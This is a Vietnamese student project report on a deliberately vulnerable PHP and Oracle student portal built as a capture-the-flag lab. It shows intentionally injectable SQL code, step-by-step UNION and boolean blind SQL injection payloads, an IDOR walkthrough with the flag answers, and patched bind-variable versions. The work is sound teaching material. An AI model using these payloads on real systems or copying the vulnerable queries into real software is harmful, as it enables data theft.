# BÁO CÁO ĐỒ ÁN MÔN DBS401
# STRENGTHENING DATABASE SECURITY WITH ORACLE DATABASE

---

**Môn học:** DBS401 – Database Security  
**Đề tài:** Strengthening Database Security with Oracle Database  
**Nhóm:** Group 02  
**Học kỳ:** 2024  
**Ngày nộp:** *(điền ngày nộp)*  

---

## THÀNH VIÊN NHÓM

| STT | Họ và tên | MSSV | Vai trò |
|-----|-----------|------|---------|
| 1 | *(Thành viên 1)* | *(MSSV)* | Nhóm trưởng, kiến trúc hệ thống, báo cáo |
| 2 | *(Thành viên 2)* | *(MSSV)* | Backend PHP, web application |
| 3 | *(Thành viên 3)* | *(MSSV)* | Oracle Database, schema, seed data |
| 4 | *(Thành viên 4)* | *(MSSV)* | Security testing, khai thác, thiết kế flag |
| 5 | *(Thành viên 5)* | *(MSSV)* | Triển khai, setup.sh, tài liệu |

**Giảng viên hướng dẫn:** *(Tên giảng viên)*

---

## MỤC LỤC

1. Giới thiệu  
2. Công nghệ sử dụng  
3. Kiến trúc hệ thống  
4. Thiết kế database Oracle  
5. Mô tả web application  
6. Ba lỗ hổng bảo mật  
7. Bảng độ khó  
8. Hướng dẫn triển khai  
9. Phân công công việc  
10. Kết luận  
11. Tài liệu tham khảo  

---

## 1. GIỚI THIỆU

### 1.1 Bối cảnh bảo mật cơ sở dữ liệu

Cơ sở dữ liệu (Database) là trung tâm lưu trữ mọi thông tin quan trọng của tổ chức, từ thông tin cá nhân người dùng đến dữ liệu tài chính và bí mật kinh doanh. Theo báo cáo của IBM Security (2023), chi phí trung bình của một vụ rò rỉ dữ liệu toàn cầu lên tới 4,45 triệu USD. Các lỗ hổng bảo mật trong tầng database thường là nguyên nhân trực tiếp dẫn đến những thiệt hại nghiêm trọng này.

Oracle Database là một trong những hệ quản trị cơ sở dữ liệu quan hệ hàng đầu thế giới, được sử dụng rộng rãi trong các tổ chức tài chính, giáo dục và chính phủ. Hiểu rõ các lỗ hổng bảo mật trong Oracle và cách vá chúng là kỹ năng thiết yếu cho kỹ sư phần mềm và chuyên gia bảo mật.

### 1.2 Mục tiêu đồ án

Đồ án DBS401 của nhóm 02 hướng đến các mục tiêu sau:

- Xây dựng một web application thực tế kết nối Oracle Database.
- Cố tình tích hợp 3 lỗ hổng bảo mật liên quan trực tiếp đến database.
- Trình bày quy trình phát hiện, khai thác và vá lỗi từng lỗ hổng.
- Xây dựng hệ thống CTF (Capture The Flag) nhằm tăng tính thực hành cho người học.

### 1.3 Phạm vi thực hiện

Toàn bộ dự án hoạt động trong môi trường **lab học tập nội bộ**:

- Web application chạy local tại `http://127.0.0.1/dbs401-oracle-app`
- Oracle Database XE/Free chạy local trên cùng máy
- Mọi payload và kỹ thuật khai thác chỉ áp dụng trên hệ thống do nhóm tự xây dựng

### 1.4 Cam kết an toàn

> **Nhóm cam kết:** Tất cả nội dung khai thác trong đồ án này chỉ được thực hiện trên web application và database do nhóm tự xây dựng và kiểm soát. Không áp dụng bất kỳ kỹ thuật nào lên hệ thống thực tế, hệ thống của bên thứ ba, hoặc môi trường ngoài phạm vi lab.

---

## 2. CÔNG NGHỆ SỬ DỤNG

| Thành phần | Phiên bản | Mục đích |
|-----------|-----------|---------|
| Ubuntu | 20.04 / 22.04 LTS | Hệ điều hành server |
| Apache2 | 2.4.x | Web server |
| PHP | 8.1.x | Backend scripting |
| Oracle Database | XE 21c / 23c Free | Cơ sở dữ liệu chính |
| Oracle Instant Client | 21.x | Kết nối PHP ↔ Oracle |
| OCI8 | 3.x (PHP extension) | Driver PHP cho Oracle |
| SQL*Plus | Theo Oracle XE | Công cụ quản lý DB |
| Python | 3.x | Script khai thác Vuln 3 |
| Burp Suite | Community | Intercepting HTTP requests |

---

## 3. KIẾN TRÚC HỆ THỐNG

```
┌─────────────────────────────────────────────────────────┐
│                    User Browser                         │
│           (Burp Suite / curl / Python script)           │
└────────────────────────┬────────────────────────────────┘
                         │ HTTP Request
                         ▼
┌─────────────────────────────────────────────────────────┐
│              Apache2 Web Server                         │
│         /var/www/html/dbs401-oracle-app/                │
└────────────────────────┬────────────────────────────────┘
                         │ PHP Execution
                         ▼
┌─────────────────────────────────────────────────────────┐
│                  PHP 8.1 Backend                        │
│  ┌─────────┐  ┌──────────┐  ┌───────────┐  ┌────────┐  │
│  │config.php│  │search.php│  │transcript │  │secret_ │  │
│  │(session) │  │(Vuln 1) │  │.php(Vuln2)│  │check   │  │
│  └─────────┘  └──────────┘  └───────────┘  │(Vuln 3)│  │
│                                              └────────┘  │
└────────────────────────┬────────────────────────────────┘
                         │ OCI8 oci_connect()
                         ▼
┌─────────────────────────────────────────────────────────┐
│           Oracle Instant Client (OCI8 Driver)           │
│              TNS: localhost:1521/XE                     │
└────────────────────────┬────────────────────────────────┘
                         │ Oracle Net Protocol
                         ▼
┌─────────────────────────────────────────────────────────┐
│          Oracle Database XE 21c / 23c Free              │
│  User: DBS401_USER  │  Service: XE                      │
│  ┌────────────────────────────────────────────────────┐ │
│  │ USERS │ STUDENTS │ COURSES │ ENROLLMENTS            │ │
│  │ AUDIT_LOGS │ FLAGS │ ADMIN_SECRETS │ CONFIG_STORE   │ │
│  │ FAKE_FLAGS │ SYSTEM_HINTS │ FLAG_ARCHIVE            │ │
│  └────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────┘
```

### 3.1 Luồng hoạt động chính

**Luồng Login:**
1. User gửi POST với username/password
2. PHP query Oracle với bind variable (login KHÔNG bị lỗ hổng)
3. Xác thực password bằng `password_verify()` (bcrypt)
4. Lưu user_id, username, role vào PHP session
5. Redirect đến dashboard

**Luồng phân quyền:**
- `$_SESSION['role']` = student / teacher / admin
- Admin: truy cập admin.php, audit.php (toàn bộ logs)
- Teacher: truy cập search.php
- Student: chỉ xem transcript và profile của mình

**Điểm đặt lỗ hổng cố ý:**
- `search.php`: Tham số `?q=` không được parameterize → SQLi
- `transcript.php`: Tham số `?ref=` không kiểm tra ownership → IDOR
- `secret_check.php`: Tham số `?key=` không được parameterize → Blind SQLi

---

## 4. THIẾT KẾ DATABASE ORACLE

### 4.1 Entity-Relationship Overview

```
USERS ──────── STUDENTS ──── ENROLLMENTS ──── COURSES
  │                               │
  │                           AUDIT_LOGS
  │
  └── ADMIN_SECRETS, CONFIG_STORE, FLAGS,
      FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE
```

### 4.2 Mô tả các bảng chính

**USERS** – Tài khoản đăng nhập  
**STUDENTS** – Thông tin sinh viên (bao gồm sinh viên ẩn cho CTF)  
**COURSES** – Danh sách môn học  
**ENROLLMENTS** – Đăng ký môn + điểm, có `transcript_ref` và `internal_note`  
**AUDIT_LOGS** – Ghi log hành động, `metadata_note` chứa fragment mã hóa  
**FLAGS** – Lưu flag part A (hex encoded), có decoy  
**ADMIN_SECRETS** – Lưu secret thật + fake, target của Blind SQLi  
**CONFIG_STORE** – Cấu hình hệ thống, chứa flag suffix (hex encoded)  
**FAKE_FLAGS** – Bảng chứa fake flags để đánh lạc hướng  
**SYSTEM_HINTS** – Gợi ý gián tiếp cho người khai thác  
**FLAG_ARCHIVE** – Bảng decoy trông giống bảng flag nhưng chứa fake data  

### 4.3 Chiến lược lưu trữ flag

Để đạt mức độ Very Hard, flag không được lưu nguyên văn ở bất kỳ bảng nào:

| Flag | Part | Vị trí | Encoding |
|------|------|---------|----------|
| Flag 1 | A | FLAGS.flag_part (part_order=1) | Hex encoding |
| Flag 1 | B | AUDIT_LOGS.metadata_note | Reversed string trong JSON |
| Flag 1 | C | CONFIG_STORE.config_value (key='sys_alpha_marker') | Base64 encoding |
| Flag 2 | A | ENROLLMENTS.internal_note (transcript_ref='TXN-099-2024-S1') | Base64 encoding |
| Flag 2 | B | AUDIT_LOGS.metadata_note (action='TRANSCRIPT_EXPORT_HIDDEN') | Reversed string trong JSON |
| Flag 3 | A | ADMIN_SECRETS.encrypted_value (key='oracle_flag_3_primary') | Blind SQLi extraction |
| Flag 3 | B | CONFIG_STORE.config_value (key='oracle_flag_3_suffix') | Hex encoding |

---

## 5. MÔ TẢ WEB APPLICATION

### 5.1 FPT Student Portal

Nhóm xây dựng mô phỏng **cổng thông tin sinh viên FPT** với các chức năng:

| Trang | Chức năng | Ghi chú |
|-------|-----------|---------|
| `/login.php` | Đăng nhập | Secure (parameterized) |
| `/dashboard.php` | Tổng quan tài khoản | Xem điểm, enrollment |
| `/search.php` | Tìm kiếm sinh viên | **[VULN 1]** SQLi |
| `/profile.php` | Xem thông tin cá nhân | Secure |
| `/transcript.php` | Xem bảng điểm/transcript | **[VULN 2]** IDOR |
| `/audit.php` | Xem audit log | **[VULN 2 - phụ]** IDOR |
| `/admin.php` | Quản trị hệ thống | Admin only |
| `/secret_check.php` | API kiểm tra secret key | **[VULN 3]** Blind SQLi |

### 5.2 Tài khoản demo

| Username | Password | Role |
|----------|----------|------|
| admin | Admin@DBS401!2024 | Quản trị viên |
| teacher1 | Teacher@123 | Giáo viên |
| student1 | Student@123 | Sinh viên |
| student2 | Student@123 | Sinh viên |
| student3 | Student@123 | Sinh viên |

---

## 6. BA LỖ HỔNG BẢO MẬT

---

### 6.1 VULNERABILITY 1 – Oracle SQL Injection

**Mức độ lỗ hổng (phân loại DBS401):** Easy  
**Mức độ tìm flag:** Very Hard  
**Vị trí:** `search.php`, tham số `?q=`  
**Loại tấn công:** UNION-based SQL Injection  

#### Mô tả lỗ hổng

Chức năng tìm kiếm sinh viên nhận tham số `q` từ URL và nhúng trực tiếp vào câu lệnh SQL mà không sử dụng parameterized query. Mặc dù có blacklist lọc một số từ khóa DDL (DROP, DELETE), blacklist này không ngăn được UNION SELECT, FROM, WHERE – những thành phần cốt lõi của SQL Injection.

#### Đoạn code bị lỗi

```php
// VULNERABLE – string concatenation
$sql = "SELECT student_id, full_name, major
        FROM STUDENTS
        WHERE (full_name LIKE '%$keyword%' OR major LIKE '%$keyword%')
        AND hidden_marker = 'NORMAL'
        AND ROWNUM <= 5";
```

#### Nguyên nhân

- Không sử dụng `oci_bind_by_name()` để parameterize input.
- Blacklist chỉ chặn DDL, không chặn các từ khóa DML/query như UNION, SELECT.
- Lỗi SQL bị suppress nhưng injection vẫn hoạt động.

#### Tác động

- Kẻ tấn công có thể đọc toàn bộ dữ liệu trong database (bao gồm FLAGS, ADMIN_SECRETS, CONFIG_STORE, AUDIT_LOGS).
- Rò rỉ cấu trúc database qua USER_TABLES, USER_TAB_COLUMNS.
- Đọc thông tin nhạy cảm của người dùng khác.

#### Kịch bản khai thác (lab)

```
Bước 1: Xác nhận injection
  q=' AND '1'='1  →  trả về kết quả bình thường
  q=' AND '1'='2  →  trả về rỗng → confirmed

Bước 2: Xác định số cột
  q=' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1

Bước 3: Enumerate bảng
  q=' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1

Bước 4: Lấy flag parts từ FLAGS, AUDIT_LOGS, CONFIG_STORE
  q=' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE part_order=1 AND '1'='1
  q=' UNION SELECT 1,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND '1'='1
  q=' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1

Bước 5: Decode và ghép 3 phần flag
  Part A (hex):    DBS401{SQL_
  Part B (reverse): 1nj3ct10n_
  Part C (base64):  0r4cl3!}
```

#### Vì sao flag Very Hard

- Output bị giới hạn 5 rows, cần nhiều payload khác nhau.
- Tồn tại nhiều bảng decoy (FLAG_ARCHIVE) và fake flag (FAKE_FLAGS).
- Các phần flag được encode khác nhau (hex/reverse/base64) → cần decode thủ công.
- Cần query Oracle-specific metadata tables (USER_TABLES, USER_TAB_COLUMNS).
- Phải xác định đúng thứ tự ghép 3 phần bằng cách đọc hint trong metadata.

#### Cách khắc phục

```php
// Secure version – bind variable
$param = '%' . $keyword . '%';
$sql   = "SELECT student_id, full_name, major FROM STUDENTS
          WHERE (full_name LIKE :kw OR major LIKE :kw2)
          AND hidden_marker = 'NORMAL' AND ROWNUM <= 10";
$stmt = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw',  $param);
oci_bind_by_name($stmt, ':kw2', $param);
oci_execute($stmt);
```

---

### 6.2 VULNERABILITY 2 – IDOR + Broken Access Control + Database Logic Flaw

**Mức độ lỗ hổng (phân loại DBS401):** Medium  
**Mức độ tìm flag:** Very Hard  
**Vị trí:** `transcript.php` (?ref=), `audit.php` (?log_id=)  
**Loại tấn công:** Insecure Direct Object Reference (IDOR)  

#### Mô tả lỗ hổng

Endpoint xem transcript không kiểm tra quyền sở hữu (ownership). Bất kỳ người dùng nào đã đăng nhập đều có thể xem transcript của sinh viên khác bằng cách thay đổi tham số `ref`. Token `transcript_ref` được tạo theo mẫu dự đoán được (`TXN-{id:03d}-{year}-S{sem}`), cho phép kẻ tấn công enumerate các bản ghi ẩn.

#### Đoạn code bị lỗi

```php
// VULNERABLE – không có ownership check, không có bind variable
$sql = "SELECT e.*, s.*, c.*
        FROM ENROLLMENTS e
        JOIN STUDENTS s ON e.student_id = s.student_id
        JOIN COURSES c  ON e.course_id  = c.course_id
        WHERE e.transcript_ref = '$ref'";  // ← bất kỳ ref nào đều được
```

#### Nguyên nhân

- Không join với USERS và không kiểm tra `s.user_id = session_user_id`.
- `transcript_ref` có pattern đơn giản, dễ đoán.
- `internal_note` và `admin_ref_id` bị lộ trong response cho mọi user.

#### Tác động

- Người dùng có thể xem điểm, thông tin cá nhân, và ghi chú nội bộ của sinh viên khác.
- Rò rỉ thông tin sinh viên ẩn không có trong danh sách công khai.
- Có thể dẫn đến việc khai thác dữ liệu nhạy cảm kết hợp với audit log.

#### Kịch bản khai thác (lab)

```
Bước 1: Login student1, quan sát transcript_ref của bản thân
  TXN-001-2024-S1 → nhận ra pattern TXN-{id:3}-{year}-S{sem}

Bước 2: Enumerate bằng cách thay đổi student ID
  TXN-004-2024-S1 → có dữ liệu nhưng internal_note là FAKE (decoy)
  TXN-050-2024-S1 → 403 (simulated restriction)
  TXN-099-2024-S1 → 🎯 HIT! Hidden student, có CLASSIFIED_DATA

Bước 3: Đọc internal_note của TXN-099-2024-S1
  CLASSIFIED_DATA: REJTNDAxezFET1JfVHI0bnNf
  → base64_decode → DBS401{1DOR_Tr4ns_  (Part A)

Bước 4: Theo dõi Admin Log Ref → truy cập audit.php?log_id=N
  metadata_note chứa: "fragment_b":"}!w4lF_ss3cc4","decode_hint":"reverse_this_part"
  → reverse("}!w4lF_ss3cc4") → 4cc3ss_Fl4w!}  (Part B)

Bước 5: Ghép flag
  DBS401{1DOR_Tr4ns_ + 4cc3ss_Fl4w!} = DBS401{1DOR_Tr4ns_4cc3ss_Fl4w!}
```

#### Vì sao flag Very Hard

- Hidden student (ID 99) không xuất hiện trong danh sách tìm kiếm bình thường.
- Student ID 4 (decoy) có fake internal_note để đánh lừa.
- Range 40–60 trả về 403, buộc người chơi phải thử range khác.
- Cần 2 IDOR khác nhau: transcript.php + audit.php.
- Flag split với encoding khác nhau (base64 + reverse).

#### Cách khắc phục

```php
// Secure version – ownership enforced
$sql = "SELECT e.enrollment_id, e.transcript_ref, e.semester, e.score,
               s.full_name, s.major, c.course_name
        FROM ENROLLMENTS e
        JOIN STUDENTS s ON e.student_id = s.student_id
        JOIN COURSES  c ON e.course_id  = c.course_id
        JOIN USERS    u ON s.user_id    = u.user_id
        WHERE e.transcript_ref = :ref
          AND u.user_id = :uid";   -- ownership check!
$stmt = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':ref', $ref);
oci_bind_by_name($stmt, ':uid', $currentUserId);
oci_execute($stmt);
```

---

### 6.3 VULNERABILITY 3 – Oracle Boolean-Based Blind SQL Injection

**Mức độ lỗ hổng (phân loại DBS401):** Hard  
**Mức độ tìm flag:** Very Hard  
**Vị trí:** `secret_check.php`, tham số `?key=`  
**Loại tấn công:** Boolean-Based Blind SQL Injection  

#### Mô tả lỗ hổng

Endpoint `secret_check.php` kiểm tra sự tồn tại của một secret key trong bảng ADMIN_SECRETS. Tham số `key` được nhúng trực tiếp vào SQL mà không parameterize. Blacklist chỉ chặn comment syntax (`--`, `/*`) nhưng không chặn các từ khóa logic như AND, SUBSTR, ASCII, LENGTH. Endpoint chỉ trả về hai trạng thái (found/not_found) nên kẻ tấn công phải dùng boolean condition để suy luận dữ liệu từng ký tự một.

#### Đoạn code bị lỗi

```php
// VULNERABLE – concatenation với blacklist yếu
$sql = "SELECT COUNT(*) AS cnt FROM ADMIN_SECRETS
        WHERE secret_key = '$key' AND is_active = 1";
```

#### Nguyên nhân

- Tham số `key` không được parameterize.
- Blacklist chỉ block comment syntax, không block injection logic.
- Không giới hạn quyền: mọi user đã đăng nhập đều dùng được.

#### Tác động

- Kẻ tấn công có thể extract toàn bộ giá trị bất kỳ trường nào trong ADMIN_SECRETS.
- Kết hợp với SYSTEM_HINTS (qua Vuln 1), có thể truy cập CONFIG_STORE để lấy thêm dữ liệu.
- Bằng các payload oracle-specific, có thể mở rộng sang toàn bộ database.

#### Kịch bản khai thác (lab)

```
Bước 1: Xác nhận injection
  key=sys_master_key' AND '1'='1  → found
  key=sys_master_key' AND '1'='2  → not_found

Bước 2: Tìm đúng secret key
  key=oracle_flag_3_primary  → found

Bước 3: Xác định LENGTH = 18
  key=oracle_flag_3_primary' AND LENGTH(encrypted_value)=18 AND '1'='1  → found

Bước 4: Extract từng ký tự (Oracle SUBSTR + ASCII)
  key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,1,1))=68 AND '1'='1
  key=oracle_flag_3_primary' AND ASCII(SUBSTR(encrypted_value,2,1))=66 AND '1'='1
  ... (18 vòng lặp)
  → DBS401{Bl1nd_B00l_  (Part A)

Bước 5: Lấy Part B từ CONFIG_STORE (qua Vuln 1 SQLi)
  → hex: 307234636C335F58337274217D
  → decode → 0r4cl3_X3rt!}  (Part B)

Bước 6: Ghép flag
  DBS401{Bl1nd_B00l_ + 0r4cl3_X3rt!} = DBS401{Bl1nd_B00l_0r4cl3_X3rt!}
```

#### Vì sao flag Very Hard

- Không có output trực tiếp → bắt buộc dùng boolean inference.
- Cần hàng chục request để extract từng ký tự.
- Tồn tại fake key (`oracle_flag_3_backup`) với is_active=1 → dễ nhầm lẫn.
- Part B cần lấy từ CONFIG_STORE bằng kỹ thuật khác (Vuln 1 SQLi).
- Part B được hex encoded → cần decode.
- Cần phân biệt Part A thật vs Part A của fake key.

#### Cách khắc phục

```php
// Secure version – bind variable + input whitelist
if (!preg_match('/^[a-zA-Z0-9_]{1,64}$/', $key)) {
    echo json_encode(['status' => 'error', 'message' => 'Invalid key format']);
    exit;
}
$sql  = "SELECT COUNT(*) AS cnt FROM ADMIN_SECRETS
         WHERE secret_key = :sk AND is_active = 1";
$stmt = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':sk', $key);
oci_execute($stmt);
```

---

## 7. BẢNG ĐỘ KHÓ

| Lỗ hổng | Loại | Mức độ lỗ hổng (DBS401) | Mức độ tìm flag |
|---------|------|--------------------------|-----------------|
| Vulnerability 1 | Oracle SQL Injection | **Easy** | **Very Hard** |
| Vulnerability 2 | IDOR + Broken Access Control | **Medium** | **Very Hard** |
| Vulnerability 3 | Oracle Boolean-Based Blind SQLi | **Hard** | **Very Hard** |

> **Ghi chú quan trọng:**  
> Nhóm tuân thủ khuyến nghị Easy – Medium – Hard cho mức độ nhận diện và phân loại lỗ hổng theo yêu cầu môn DBS401. Tuy nhiên, để tăng tính thử thách CTF và khả năng phân tích database security thực tế, cả 3 flag đều được thiết kế ở mức **Very Hard**. Người kiểm thử không thể lấy flag bằng một request đơn giản mà phải kết hợp: recon, phân tích request/response, truy vấn Oracle metadata, loại bỏ dữ liệu giả (fake flags, decoy tables), decode (hex/base64/reverse), và ghép nhiều mảnh flag từ nhiều bảng khác nhau.

---

## 8. HƯỚNG DẪN TRIỂN KHAI LOCAL

### 8.1 Yêu cầu hệ thống

- Ubuntu 20.04 / 22.04 LTS (khuyến nghị dùng VM/VirtualBox)
- RAM: tối thiểu 4GB (Oracle XE cần ~2GB)
- Disk: tối thiểu 20GB

### 8.2 Các bước cài đặt thủ công

**Bước 1 – Cài Apache2 và PHP:**
```bash
sudo apt-get update
sudo apt-get install -y apache2 php8.1 libapache2-mod-php8.1 php8.1-cli
```

**Bước 2 – Cài Oracle Database XE 21c:**
```bash
# Tải từ: https://www.oracle.com/database/technologies/xe-downloads.html
sudo apt-get install -y alien libaio1 bc
sudo alien --to-deb --scripts oracle-database-xe-21c-1.0-1.ol8.x86_64.rpm
sudo dpkg -i oracle-database-xe-21c*.deb
sudo /etc/init.d/oracle-xe-21c configure
sudo systemctl enable oracle-xe-21c
```

**Bước 3 – Cài Oracle Instant Client và OCI8:**
```bash
# Cài Instant Client (tải .rpm từ Oracle website)
sudo alien --to-deb oracle-instantclient-basiclite-21.*.rpm
sudo alien --to-deb oracle-instantclient-devel-21.*.rpm
sudo dpkg -i oracle-instantclient*.deb
echo /usr/lib/oracle/21/client64/lib | sudo tee /etc/ld.so.conf.d/oracle-21.conf
sudo ldconfig

# Cài OCI8 extension
sudo apt-get install -y php8.1-dev php-pear build-essential
sudo pecl install oci8
echo "extension=oci8.so" | sudo tee -a /etc/php/8.1/apache2/php.ini
echo "extension=oci8.so" | sudo tee -a /etc/php/8.1/cli/php.ini
sudo systemctl restart apache2
```

**Bước 4 – Tạo Oracle user:**
```sql
-- Chạy trong SQLPlus với SYS
CREATE USER dbs401_user IDENTIFIED BY dbs401_pass;
GRANT CONNECT, RESOURCE, CREATE SESSION TO dbs401_user;
GRANT CREATE TABLE, CREATE SEQUENCE TO dbs401_user;
ALTER USER dbs401_user QUOTA UNLIMITED ON USERS;
```

**Bước 5 – Import schema và seed data:**
```bash
sqlplus dbs401_user/dbs401_pass@localhost:1521/XE @/path/to/database/schema.sql
sqlplus dbs401_user/dbs401_pass@localhost:1521/XE @/path/to/database/seed.sql
php /var/www/html/dbs401-oracle-app/database/init_passwords.php
```

**Bước 6 – Deploy web app:**
```bash
sudo bash setup.sh
```

### 8.3 URL truy cập

- **Local (máy host):** `http://127.0.0.1/dbs401-oracle-app`
- **LAN (nhóm khác test):** `http://<IP-LAN>/dbs401-oracle-app`
  - Lấy IP LAN: `hostname -I | awk '{print $1}'`

> **Lưu ý:** `127.0.0.1` chỉ truy cập được từ chính máy đang chạy server. Nếu nhóm khác hoặc giảng viên cần test từ máy khác trong cùng mạng LAN, phải dùng IP LAN của máy host.

> **Về setup.sh:** Script mặc định copy source từ thư mục hiện tại vào `/var/www/html/dbs401-oracle-app`. Nếu project được host trên GitHub, có thể sửa biến `REPO_URL` trong setup.sh để script tự clone.

---

## 9. PHÂN CÔNG CÔNG VIỆC

| Thành viên | Nhiệm vụ | Chi tiết |
|-----------|---------|---------|
| **Member 1** (Nhóm trưởng) | System design + Report | Thiết kế kiến trúc tổng thể, viết báo cáo, điều phối nhóm |
| **Member 2** | Backend PHP | Viết toàn bộ source PHP: login, dashboard, search, transcript, admin, secret_check |
| **Member 3** | Oracle Database | Thiết kế schema, viết seed data, tạo flag data, quản lý DB user |
| **Member 4** | Security + CTF Design | Thiết kế 3 lỗ hổng, flag logic, fake flags, ANSWER_KEY, script exploit |
| **Member 5** | Deployment + Docs | setup.sh, README, hướng dẫn cài đặt, troubleshooting, demo |

---

## 10. KẾT LUẬN

### 10.1 Những gì đã học được

Qua quá trình thực hiện đồ án, nhóm đã học được:

- **SQL Injection thực tế:** Hiểu sâu về cơ chế injection trong Oracle Database, sự khác biệt giữa Oracle SQL và MySQL (DUAL, ROWNUM, USER_TABLES, SUBSTR syntax).
- **IDOR và Access Control:** Nhận thức rõ tầm quan trọng của việc kiểm tra ownership ở tầng database, không chỉ ở tầng UI.
- **Blind SQL Injection:** Kỹ thuật khai thác khi không có direct output, sử dụng boolean condition + SUBSTR + ASCII để extract dữ liệu từng ký tự.
- **Oracle OCI8:** Cách sử dụng bind variables trong PHP-Oracle để phòng tránh SQLi.
- **CTF Design:** Thiết kế hệ thống flag phức tạp với nhiều lớp encoding và decoy.

### 10.2 Khó khăn gặp phải

- Cài đặt Oracle XE trên Ubuntu phức tạp hơn MySQL/PostgreSQL nhiều.
- OCI8 extension cần cài thủ công và phụ thuộc Oracle Instant Client.
- Oracle SQL syntax khác biệt (không có `LIMIT`, dùng `ROWNUM`; không có `INFORMATION_SCHEMA`, dùng `USER_TABLES`).
- Cân bằng độ khó CTF giữa 3 flag để đảm bảo cả 3 đều Very Hard.

### 10.3 Hướng phát triển

- Bổ sung thêm lỗ hổng: Time-Based Blind SQLi, Oracle XML Injection, Privilege Escalation.
- Tích hợp WAF (Web Application Firewall) demo để so sánh hiệu quả.
- Xây dựng hệ thống tự động chấm điểm CTF online.
- Triển khai lên OCI (Oracle Cloud Infrastructure) Free Tier.

---

## 11. TÀI LIỆU THAM KHẢO

1. OWASP Foundation. (2021). *OWASP Top 10:2021 – A03 Injection*. https://owasp.org/Top10/A03_2021-Injection/
2. OWASP Foundation. (2021). *OWASP Top 10:2021 – A01 Broken Access Control*. https://owasp.org/Top10/A01_2021-Broken_Access_Control/
3. Oracle Corporation. (2023). *Oracle Database Security Guide 21c*. https://docs.oracle.com/en/database/oracle/oracle-database/21/dbseg/
4. Oracle Corporation. (2023). *PHP OCI8 Extension Documentation*. https://www.php.net/manual/en/book.oci8.php
5. PortSwigger. (2023). *SQL Injection Cheat Sheet – Oracle*. https://portswigger.net/web-security/sql-injection/cheat-sheet
6. PortSwigger. (2023). *Insecure Direct Object References (IDOR)*. https://portswigger.net/web-security/access-control/idor
7. IBM Security. (2023). *Cost of a Data Breach Report 2023*. https://www.ibm.com/reports/data-breach
8. CWE. (2023). *CWE-89: Improper Neutralization of Special Elements used in an SQL Command*. https://cwe.mitre.org/data/definitions/89.html
9. CWE. (2023). *CWE-639: Authorization Bypass Through User-Controlled Key*. https://cwe.mitre.org/data/definitions/639.html

---

*Báo cáo được soạn thảo bởi Group 02 – DBS401*  
*Cam kết: Tất cả nội dung khai thác trong báo cáo này chỉ được thực hiện trong môi trường lab học tập nội bộ.*
